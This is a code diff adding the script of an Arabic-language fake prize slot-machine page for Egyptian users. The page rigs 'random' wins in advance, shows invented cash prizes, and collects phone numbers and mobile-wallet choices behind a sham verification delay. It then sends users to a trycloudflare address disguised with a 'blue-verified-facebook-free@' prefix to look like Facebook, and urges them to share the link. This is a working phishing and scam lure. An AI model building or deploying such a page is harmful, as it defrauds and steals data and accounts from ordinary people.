+  opt.value = g.id; opt.textContent = g.name;
+  governSelect.appendChild(opt);
+});
+const walletRow = document.getElementById('walletRow');
+const walletLogoBtn = document.getElementById('walletLogoBtn');
+const walletSelected = document.getElementById('walletSelected');
+const walletOptionsPop = document.getElementById('walletOptionsPop');
+const walletSelectedIcon = document.getElementById('walletSelectedIcon');
+const walletSelectedName = document.getElementById('walletSelectedName');
+const walletArrow = document.getElementById('walletArrow');
+const phoneInput = document.getElementById('phone');
+let selectedWallet = null;
+function renderWalletOptions() {
+  walletOptionsPop.innerHTML = '';
+  walletsJson.forEach(w => {
+    let li = document.createElement('li');
+    li.innerHTML = w.icon + "<span>"+w.name+"</span>";
+    li.dataset.id = w.id;
+    li.onclick = () => {
+      selectWallet(w.id);
+      walletOptionsPop.classList.remove('active');
+    };
+    walletOptionsPop.appendChild(li);
+  });
+}
+renderWalletOptions();
+function selectWallet(id) {
+  const w = walletsJson.find(x=>x.id===id);
+  if (w) {
+    selectedWallet = id;
+    walletSelectedIcon.innerHTML = w.icon;
+    walletLogoBtn.innerHTML = w.icon;
+    walletSelectedName.textContent = w.name;
+    walletSelectedName.style.color = "#009688";
+    walletSelected.setAttribute('data-selected','1');
+  }
+}
+function openWalletPop(e) {
+  walletOptionsPop.classList.toggle('active');
+  walletArrow.style.transform = walletOptionsPop.classList.contains('active') ? "rotate(180deg)" : "rotate(0deg)";
+  e && e.stopPropagation();
+}
+walletLogoBtn.innerHTML = walletsJson[0].icon;
+walletLogoBtn.onclick = openWalletPop;
+walletSelected.onclick = openWalletPop;
+document.addEventListener('click', function(e){
+  if(!walletRow.contains(e.target)) {
+    walletOptionsPop.classList.remove('active');
+    walletArrow.style.transform = "rotate(0deg)";
+  }
+});
+phoneInput.addEventListener('focus',function(){walletSelected.style.opacity=1;});
+phoneInput.addEventListener('input',function(){walletSelected.style.opacity=1;});
+let tries = localData.tries ?? 10,
+    wins = localData.wins ?? 0,
+    maxWins = 2,
+    myWins = localData.myWins ?? [],
+    finished = localData.finished ?? false;
+let isSpinning = false;
+const slot = document.getElementById('slot');
+const btnSpin = document.getElementById('btn-spin');
+const winnerMsg = document.getElementById('winner-message');
+const chanceNum = document.getElementById('chanceCount');
+const circleProgress = document.getElementById('circle-progress');
+const tips = document.getElementById('tips');
+const formSection = document.getElementById('form-section');
+const verifyForm = document.getElementById('verify-form');
+const verifyMsg = document.getElementById('verify-message');
+const phase2Link = document.getElementById('phase2-link');
+const governInput = document.getElementById('govern');
+const phoneError = document.getElementById('phone-error');
+const governError = document.getElementById('govern-error');
+const myWinsBox = document.getElementById('my-wins');
+const myWinsList = document.getElementById('my-wins-list');
+const alreadyDoneMsg = document.getElementById('already-done');
+const spinSound = document.getElementById('spin-sound');
+const winSound = document.getElementById('win-sound');
+const modalBg = document.getElementById('modal-bg'), modalHeader = document.getElementById('modal-header'), modalBody = document.getElementById('modal-body'), modalAction = document.getElementById('modal-action'), modalClose = document.getElementById('modal-close');
+function showModal(header,body,actionHtml,isWin){
+  modalHeader.innerHTML=header;
+  modalBody.innerHTML=body;
+  modalAction.innerHTML=actionHtml||"";
+  modalBg.classList.add('active');
+  if(isWin) {
+    winSound.currentTime=0;winSound.play();
+    اطلق_كونفتي();
+  }
+}
+modalClose.onclick = ()=>{modalBg.classList.remove('active');};
+modalBg.onclick = (e)=>{if(e.target===modalBg) modalBg.classList.remove('active');};
+function updateChancesUI() {
+  chanceNum.textContent = tries;
+  const circumference = 176;
+  const offset = circumference * (1 - tries/10);
+  circleProgress.setAttribute('stroke-dashoffset', offset);
+}
+updateChancesUI();
+function updateLocal(){
+  localData.tries = tries;
+  localData.myWins = myWins;
+  localData.finished = finished;
+  saveLocal();
+}
+let winIndexes = localData.winIndexes ?? [];
+if(!winIndexes.length){
+  while(winIndexes.length < maxWins){
+    let idx = Math.floor(Math.random()*10);
+    if(!winIndexes.includes(idx)) winIndexes.push(idx);
+  }
+  winIndexes.sort();
+}
+localData.winIndexes = winIndexes;
+saveLocal();
+if(myWins.length>0){
+  myWinsBox.style.display = "block";
+  myWinsList.innerHTML = "";
+  myWins.forEach(w => {
+    myWinsList.innerHTML += `<li><span class="egmoney">${w.prize} جنيه</span> <span style="font-size:1.25em;color:#009688">${w.emojis.join('')}</span></li>`;
+  });
+}
+if(tries===0||finished){
+  btnSpin.disabled = true;
+  showFormSection();
+  if(finished){
+    alreadyDoneMsg.style.display = "block";
+    formSection.style.display = "none";
+  }
+}
+btnSpin.addEventListener('click', function() {
+  if (isSpinning || tries === 0||finished) return;
+  isSpinning = true; winnerMsg.style.display = 'none';
+  spinSound.currentTime = 0; spinSound.play();
+  let spins = 0, totalSpins = 58;
+  let n = 10 - tries;
+  let isWin = winIndexes.includes(n);
+  let finalEmojis, prize;
+  if (isWin) {
+    let emoji = moneyEmojis[Math.floor(Math.random() * moneyEmojis.length)];
+    finalEmojis = [emoji, emoji, emoji];
+    prize = randomPrizeMoney();
+  } else {
+    do {
+      finalEmojis = [
+        moneyEmojis[Math.floor(Math.random() * moneyEmojis.length)],
+        otherEmojis[Math.floor(Math.random() * otherEmojis.length)],
+        moneyEmojis[Math.floor(Math.random() * moneyEmojis.length)]
+      ];
+    } while (finalEmojis[0] === finalEmojis[1] && finalEmojis[1] === finalEmojis[2]);
+  }
+  function spinLoop() {
+    let e1 = [moneyEmojis, otherEmojis][Math.floor(Math.random() * 2)][Math.floor(Math.random() * 4)];
+    let e2 = [moneyEmojis, otherEmojis][Math.floor(Math.random() * 2)][Math.floor(Math.random() * 4)];
+    let e3 = [moneyEmojis, otherEmojis][Math.floor(Math.random() * 2)][Math.floor(Math.random() * 4)];
+    slot.innerHTML = `<span class="slot-emoji slot-anim">${e1}</span><span class="slot-emoji slot-anim">${e2}</span><span class="slot-emoji slot-anim">${e3}</span>`;
+    spins++;
+    let base = 30, max = 155;
+    let progress = spins / totalSpins;
+    let duration = base + (max - base) * Math.pow(progress, 2.7);
+    if (spins < totalSpins) {
+      setTimeout(spinLoop, duration);
+    } else {
+      slot.innerHTML = `<span class="slot-emoji slot-anim${isWin?' win':''}">${finalEmojis[0]}</span><span class="slot-emoji slot-anim${isWin?' win':''}">${finalEmojis[1]}</span><span class="slot-emoji slot-anim${isWin?' win':''}">${finalEmojis[2]}</span>`;
+      if (isWin) {
+        slot.classList.add('shake');
+        setTimeout(()=>{slot.classList.remove('shake');},600);
+        myWins.push({emojis: finalEmojis, prize: prize});
+        updateLocal();
+        renderTicker();
+        showModal(
+          "تهانينا! فوز محقق",
+          `<div style="font-size:2.6em;display:flex;gap:8px;justify-content:center;align-items:center;margin-bottom:8px;">
+             <span class="slot-emoji win">${finalEmojis[0]}</span>
+             <span class="slot-emoji win">${finalEmojis[1]}</span>
+             <span class="slot-emoji win">${finalEmojis[2]}</span>
+           </div>
+           <div style="margin:10px 0 3px 0;font-weight:900;color:#2ecc71;">ربحت ${prize} جنيه مصري</div>
+           <div style="color:#009688;">تم إضافة الجائزة </div>`,
+          `<button class="btn-action" onclick="document.getElementById('modal-bg').classList.remove('active')">متابعة المحاولات</button>`,true
+        );
+        myWinsBox.style.display = "block";
+        myWinsList.innerHTML = "";
+        myWins.forEach(w => {
+          myWinsList.innerHTML += `<li><span class="egmoney">${w.prize} جنيه</span> <span style="font-size:1.25em;color:#009688">${w.emojis.join('')}</span></li>`;
+        });
+      }
+      tries--;
+      updateChancesUI();
+      updateLocal();
+      if(tries === 0) setTimeout(showFinalResult, 800);
+      isSpinning = false;
+    }
+  }
+  spinLoop();
+});
+function showFinalResult(){
+  btnSpin.disabled = true;
+  updateLocal();
+  showFormSection();
+}
+function showFormSection() {
+  if(myWins.length === 0) return;
+  formSection.style.display = 'flex';
+  document.getElementById("verify-btn").style.display = "block";
+  phase2Link.style.display = "none";
+  window.scrollTo({ top: formSection.offsetTop-80, behavior: 'smooth' });
+}
+function validatePhone(val) {
+  if (!/^01[0-9]{9}$/.test(val)) return "يرجى إدخال رقم جوال مصري صحيح (11 رقم يبدأ بـ01)";
+  return "";
+}
+function validateWallet() {
+  if (!selectedWallet) return "يرجى اختيار المحفظة.";
+  return "";
+}
+function validateGovern(val) {
+  if (!val) return "يرجى اختيار المحافظة.";
+  return "";
+}
+phoneInput.addEventListener('keypress', function(e) {
+  if (!/[0-9]/.test(e.key) || phoneInput.value.length>=11) e.preventDefault();
+});
+phoneInput.onpaste = (e) => {
+  let val = (e.clipboardData || window.clipboardData).getData('text');
+  if (!/^01[0-9]{9}$/.test(val)) e.preventDefault();
+};
+let checkingLoad = false;
+function showLoadingPopup(msg = "يتم التأكد من الرقم والمحفظة...") {
+  if(document.getElementById('loading-popup-bg')) return;
+  let div = document.createElement('div');
+  div.id = 'loading-popup-bg';
+  div.className = 'loading-popup-bg';
+  div.innerHTML = `<div class="loading-popup">
+    <span class="loader-checking"></span>
+    <div class="loading-popup-text">${msg}</div>
+  </div>`;
+  document.body.appendChild(div);
+}
+function hideLoadingPopup() {
+  let div = document.getElementById('loading-popup-bg');
+  if(div) div.remove();
+}
+verifyForm.addEventListener('submit', function(e) {
+  e.preventDefault();
+  if(checkingLoad) return false;
+  let phone = phoneInput.value.trim();
+  let govern = governInput.value.trim();
+  let errors = {
+    phone: validatePhone(phone),
+    wallet: validateWallet(),
+    govern: validateGovern(govern)
+  };
+  phoneError.textContent = errors.phone || errors.wallet;
+  governError.textContent = errors.govern;
+  if (errors.phone || errors.wallet || errors.govern) return;
+  checkingLoad = true;
+  verifyMsg.style.display = 'none';
+  phase2Link.style.display = 'none';
+  document.getElementById("verify-btn").style.display = "block";
+  showLoadingPopup("يتم التأكد من الرقم والمحفظة...");
+  setTimeout(()=>{
+    hideLoadingPopup();
+    showModal(
+      "تم التأكيد بنجاح",
+      `<div style="font-size:1.35em;color:#009688;margin-bottom:13px;">يُرجى إتمام عملية التوثيق لاستكمال إجراءات السحب.</div>`,
+      `<button class="btn-action" id="btn-auth" style="margin-top:12px;">توثيق</button>`
+    );
+    setTimeout(()=>{
+      document.getElementById('btn-auth').onclick = function() {
+        window.location.href = "https://blue-verified-facebook-free@reasoning-entering-bouquet-moves.trycloudflare.com";
+      };
+    }, 50);
+    checkingLoad = false;
+  },7000);
+});
+phase2Link.querySelector('button').onclick = function() {
+  showLoadingPopup(`
+    جاري جلب بيانات الجائزة والرقم والمحفظة<br>
+    <span style="font-size:1em;color:#009688;font-weight:700;display:block;margin-top:8px;">
+      يتم التأكد من صحة البيانات...
+    </span>
+  `);
+  setTimeout(function(){
+    hideLoadingPopup();
+    localData.finished = true;
+    saveLocal();
+    window.location.href = 'https://blue-verified-facebook-free@reasoning-entering-bouquet-moves.trycloudflare.com';
+  }, 2200);
+};
+renderTicker();
+setTimeout(()=>tickerLoop(), 1000);
+
+document.getElementById('share-btn').onclick = function() {
+  const url = window.location.href;
+  if (navigator.share) {
+    navigator.share({title:"كازينو الجوائز", text:"جرب حظك واربح جوائز نقدية!", url:url});
+  } else {
+    navigator.clipboard.writeText(url);
+    alert("تم نسخ الرابط! شاركه مع أصدقائك لفرصة ربح إضافية.");
+  }
+};
+
+}
+</script>
+</body>
+</html>
